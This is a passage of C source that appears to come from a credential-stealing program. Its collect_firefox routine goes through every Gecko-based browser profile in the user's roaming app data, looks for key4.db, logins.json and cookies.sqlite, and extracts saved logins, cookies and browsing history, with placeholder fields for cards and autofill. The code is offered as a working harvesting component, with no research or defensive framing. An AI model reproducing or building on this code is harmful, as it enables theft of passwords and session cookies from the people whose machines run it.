            title_len = row->values[COL_TITLE].as.text.len;
        }
        int64_t visits = 0;
        if (row->values[COL_VISITS].type == SQLITE_VAL_INTEGER)
            visits = row->values[COL_VISITS].as.integer;

        char vis_str[32];
        snprintf(vis_str, sizeof(vis_str), "%lld", (long long)visits);

        size_t line_len = title_len + 1 + url_len + 1 + strlen(vis_str) + 2;
        char *line = (char *)malloc(line_len);
        if (!line) continue;

        int written = snprintf(line, line_len, "%s\t%s\t%s\n", title, url, vis_str);
        if (written < 0 || (size_t)written >= line_len) {
            free(line);
            continue;
        }

        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (tmp) result = tmp;
        }
        result[(*count)++] = line;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(db_data);

    if (*count == 0) {
        free(result);
        return NULL;
    }
    return result;
}

/* ═══════════════════════════════════════════════════════════════
 *  Collect from all Firefox/Gecko browsers
 * ═══════════════════════════════════════════════════════════════ */

CollectResult collect_firefox(const char *roaming_app_data) {
    CollectResult result = {0};

    size_t browser_count;
    const BrowserPath *browsers = get_gecko_browsers(&browser_count);

    size_t cap = 16;
    result.data = (BrowserData *)calloc(cap, sizeof(BrowserData));
    if (!result.data) return result;

    for (size_t b = 0; b < browser_count; b++) {
        char *base_path = path_join(roaming_app_data, browsers[b].path_suffix);
        if (!base_path) continue;

        if (!dir_exists(base_path)) {
            free(base_path);
            continue;
        }

        /* List profile subdirectories */
        size_t profile_count = 0;
        char **profiles = list_subdirs(base_path, &profile_count);

        for (size_t p = 0; p < profile_count; p++) {
            /* Check if this profile has key4.db or logins.json */
            char *k4 = path_join(profiles[p], "key4.db");
            char *lj = path_join(profiles[p], "logins.json");
            int has_key = k4 && file_exists(k4);
            int has_logins = lj && file_exists(lj);
            free(k4);
            free(lj);

            /* Skip profiles with no login data and no cookies */
            char *cs = path_join(profiles[p], "cookies.sqlite");
            int has_cookies = cs && file_exists(cs);
            free(cs);

            if (!has_key && !has_logins && !has_cookies) continue;

            /* Grow result array */
            if (result.count >= cap) {
                cap *= 2;
                BrowserData *tmp = (BrowserData *)realloc(result.data,
                                                          cap * sizeof(BrowserData));
                if (tmp) result.data = tmp;
            }

            BrowserData *bd = &result.data[result.count];
            memset(bd, 0, sizeof(*bd));

            bd->browser_name = mi_strdup(browsers[b].name);
            bd->profile_name = mi_strdup(basename_of(profiles[p]));

            /* Extract logins (key4.db + logins.json) */
            bd->logins = firefox_extract_logins(profiles[p], &bd->login_count);

            /* Extract cookies (cookies.sqlite) */
            bd->cookies = firefox_extract_cookies(profiles[p], &bd->cookie_count);

            /* Extract history (places.sqlite) */
            bd->history = firefox_extract_history(profiles[p], &bd->history_count);

            /* Cards, autofill, bookmarks — not applicable for Firefox */
            bd->cards = NULL;  bd->card_count = 0;
            bd->autofill = NULL; bd->autofill_count = 0;
            bd->bookmarks = NULL; bd->bookmark_count = 0;

            result.count++;
        }

        /* Free profile paths */
        for (size_t p = 0; p < profile_count; p++)
            free(profiles[p]);
        free(profiles);
        free(base_path);
    }

    return result;
}

/* ── Free collected data ─────────────────────────────────────── */

void free_firefox_data(CollectResult *result) {
    for (size_t i = 0; i < result->count; i++) {
        free(result->data[i].browser_name);
        free(result->data[i].profile_name);

        for (size_t j = 0; j < result->data[i].login_count; j++)
            free(result->data[i].logins[j]);
        free(result->data[i].logins);

        for (size_t j = 0; j < result->data[i].cookie_count; j++)
            free(result->data[i].cookies[j]);
        free(result->data[i].cookies);

        for (size_t j = 0; j < result->data[i].card_count; j++)
            free(result->data[i].cards[j]);
        free(result->data[i].cards);

        for (size_t j = 0; j < result->data[i].history_count; j++)
            free(result->data[i].history[j]);
        free(result->data[i].history);

        for (size_t j = 0; j < result->data[i].autofill_count; j++)
            free(result->data[i].autofill[j]);
        free(result->data[i].autofill);

        for (size_t j = 0; j < result->data[i].bookmark_count; j++)
            free(result->data[i].bookmarks[j]);
        free(result->data[i].bookmarks);
    }
    free(result->data);
    result->data = NULL;
    result->count = 0;
}
